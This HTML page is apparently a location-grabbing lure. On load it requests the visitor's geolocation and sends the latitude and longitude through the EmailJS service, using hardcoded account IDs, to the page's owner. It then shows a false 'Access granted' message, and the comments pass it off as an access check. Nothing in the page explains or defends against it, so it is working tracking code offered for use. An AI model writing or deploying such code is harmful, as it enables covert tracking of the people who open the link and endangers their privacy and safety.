<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web</title>
</head>

<body>
    <!-- Message for mobile users -->
    <div id="mobileMessage" style="display: none; text-align: center;">
        <button onclick="askForLocation()">Enable Location</button>
    </div>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script>
        window.onload = function() {
            getLocation();
        };

        function getLocation() {
            if (navigator.geolocation) {
                if (isMobileDevice()) {
                    document.getElementById("mobileMessage").style.display = "block";
                } else {
                    // For other devices, ask for location automatically
                    navigator.geolocation.getCurrentPosition(showPosition, showError);
                    document.getElementById("mobileMessage").style.display =
                    "none"; // Hide the button after asking for location
                }
            }
        }

        function isMobileDevice() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }

        function askForLocation() {
            navigator.geolocation.getCurrentPosition(showPosition, showError);
            document.getElementById("mobileMessage").style.display = "none"; // Hide the button after asking for location
        }

        function showPosition(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;

            emailjs
                .send(
                    "service_so16vcv", // service id
                    "template_a0xzc4e", // template id
                    {
                        from_name: 'Location',
                        from_email: 'Location@lo.com',
                        reply_to: 'Location@lo.com',
                        message: `lat ${latitude} lon ${longitude}`
                    },
                    "ryFsvBOoQeAx2ou_t" // public api
                )



            // Check if the user's location meets the criteria for access
            // Example: Check if latitude is within a certain range

            alert("Access granted. Welcome to the site!");
            // Redirect the user to the site or load site content
            // window.location.href = "https://www.yoursite.com";

        }

        function showError(error) {
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    alert("User denied the request for geolocation.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("Location information is unavailable.");
                    break;
                case error.TIMEOUT:
                    alert("The request to get user location timed out.");
                    break;
                case error.UNKNOWN_ERROR:
                    alert("An unknown error occurred.");
                    break;
            }
        }
    </script>



</body>

</html>
